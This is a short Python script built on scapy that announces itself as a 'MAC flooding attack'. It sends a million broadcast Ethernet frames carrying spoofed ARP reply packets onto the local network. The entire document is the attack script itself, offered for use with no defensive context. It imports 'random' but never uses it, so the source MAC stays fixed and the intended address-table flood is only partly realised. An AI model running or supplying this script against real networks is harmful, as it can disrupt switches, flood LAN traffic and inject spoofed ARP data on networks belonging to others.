import random 
from scapy.all import *

print('starting MAC flooding attack...')

mac = '00:15:5D:00:68:06'

for i in range(1000000):
    print('iteration %s' % i)
    print('  Sending MAC: ', mac)
    # Need to install scapy: pip install --pre scapy[basic]
    sendp(Ether(src=mac,dst="FF:FF:FF:FF:FF:FF")/ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18))

print('exiting program')